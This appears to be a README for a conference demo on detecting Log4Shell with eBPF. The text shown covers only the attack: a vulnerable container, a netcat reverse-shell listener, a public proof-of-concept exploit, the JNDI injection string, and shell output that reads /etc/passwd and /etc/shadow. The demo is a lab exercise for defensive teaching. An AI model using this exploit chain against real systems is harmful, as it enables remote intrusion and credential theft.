# The Next Log4jshell?! Preparing for CVEs with eBPF!

This repository contains the demo and the corresponding instructions that was presented at
SCALE 20x, Pasadena during the `The Next Log4jshell?! Preparing for CVEs with eBPF!` presentation.

## Environment

Setup Ubuntu machine

## Demo

(Terminal 1): Run the vulnerable web application as a container on the host network, so we will make sure it uses
the Ubuntu VMs external static IP that we setup previously.

```bash
docker run --network host -d quay.io/natalia-2-pilot/log4j-shell-webapp
```

If we open the web browser and type `<external_ip>:8080`, in my case it's `http://34.118.100.209:8080/`,
then we should be able to see the Login page of the vulnerable application:

![Screenshot](log4j_login.png)

(Terminal 2): Run the `netcat` listener that listens on port `9001` and accepts the reverse shell
connection:

```bash
nc -lvnp 9001
Listening on 0.0.0.0 9001
```

(Terminal 1): Start the POC exploit, that creates the malicious java class and sets up an 
LDAP server which will listen on port `1389`.

```bash
python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Listening on 0.0.0.0:1389
```

Paste the created JNDI lookup string `${jndi:ldap://localhost:1389/a}` to either the username or
password field of the web application, then click on `Login`:

![Screenshot](log4j_malicious_string.png)

(Terminal 1) You should see that the JNDI lookup actually connected to the LDAP, server and downloaded the
malicious `Exploit.class` Java class:

```bash
Send LDAP reference result for a redirecting to http://localhost:8000/Exploit.class
127.0.0.1 - - [04/Mar/2023 15:19:05] "GET /Exploit.class HTTP/1.1" 200 -
```

(Terminal 2) which then sent the reverse shell to the netcat listener:
```bash
root@scale-2023-log4j-ebpf-vm:/home/natalia# nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 127.0.0.1 53566
```

(Terminal 2): As a verification we can list the files in the current directory:
```
pwd
/usr/local/tomcat
ls -l
total 124
-rw-r--r-- 1 root root  57011 Jun  9  2016 LICENSE
-rw-r--r-- 1 root root   1444 Jun  9  2016 NOTICE
-rw-r--r-- 1 root root   6739 Jun  9  2016 RELEASE-NOTES
-rw-r--r-- 1 root root  16195 Jun  9  2016 RUNNING.txt
drwxr-xr-x 2 root root   4096 Aug 31  2016 bin
drwxr-xr-x 1 root root   4096 Mar  4 10:21 conf
drwxr-sr-x 3 root staff  4096 Aug 31  2016 include
drwxr-xr-x 2 root root   4096 Aug 31  2016 lib
drwxr-xr-x 1 root root   4096 Mar  4 10:21 logs
drwxr-sr-x 3 root staff  4096 Aug 31  2016 native-jni-lib
drwxr-xr-x 2 root root   4096 Aug 31  2016 temp
drwxr-xr-x 1 root root   4096 Mar  4 10:21 webapps
drwxr-xr-x 1 root root   4096 Mar  4 10:21 work
```

(Terminal 2): Or read the content of `/etc/passwd` or `/etc/shadow`:
```bash
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
messagebus:x:104:107::/var/run/dbus:/bin/false

cat /etc/shadow
root:*:17043:0:99999:7:::
daemon:*:17043:0:99999:7:::
bin:*:17043:0:99999:7:::
sys:*:17043:0:99999:7:::
sync:*:17043:0:99999:7:::
games:*:17043:0:99999:7:::
man:*:17043:0:99999:7:::
lp:*:17043:0:99999:7:::
mail:*:17043:0:99999:7:::
news:*:17043:0:99999:7:::
uucp:*:17043:0:99999:7:::
proxy:*:17043:0:99999:7:::
www-data:*:17043:0:99999:7:::
backup:*:17043:0:99999:7:::
list:*:17043:0:99999:7:::
irc:*:17043:0:99999:7:::
gnats:*:17043:0:99999:7:::
nobody:*:17043:0:99999:7:::
systemd-timesync:*:17043:0:99999:7:::
systemd-network:*:17043:0:99999:7:::
systemd-resolve:*:17043:0:99999:7:::
systemd-bus-proxy:*:17043:0:99999:7:::
messagebus:*:17044:0:99999:7:::
```